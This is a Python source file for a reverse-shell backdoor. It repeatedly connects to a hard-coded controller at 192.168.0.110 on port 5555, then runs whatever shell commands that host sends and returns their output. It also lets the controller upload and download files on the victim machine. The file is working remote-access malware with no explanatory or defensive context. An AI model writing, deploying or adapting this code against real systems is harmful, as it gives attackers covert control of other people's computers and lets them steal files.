import socket
import time
import json
import subprocess
import os

def reliable_send(data):
        jsondata = json.dumps(data)
        sock1.send(jsondata.encode())

def reliable_recv():
        data = ''
        while True:
                try:
                        data = data + sock1.recv(1024).decode().rstrip()
                        return json.loads(data)
                except ValueError:
                        continue

def connection():
	while True:
		time.sleep(20)
		try:
			sock1.connect(('192.168.0.110', 5555))
			shell()
			sock1.close()
			break
		except:
			pass

def upload_file(file_name):
	f = open(file_name, 'rb')
	sock1.send(f.read())

def download_file(file_name):
        f = open(file_name, 'wb')
        sock1.settimeout(1)
        chunk = sock1.recv(1024)
        while chunk:
                f.write(chunk)
                try:
                        chunk = sock1.recv(1024)
                except socket.timeout as e:
                        break
        sock1.settimeout(None)
        f.close()

def shell():
	while True:
		command = reliable_recv()
		if command == 'quit':
			break
		elif command[:6] == 'upload':
			download_file(command[7:])
		elif command[:8] == 'download':
			upload_file(command[9:])
		elif command == 'clear':
			pass
		elif command[:3] == 'cd ':
			os.chdir(command[3:])
		else:
			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = execute.stdout.read() + execute.stderr.read()
			result = result.decode()
			reliable_send(result)

sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
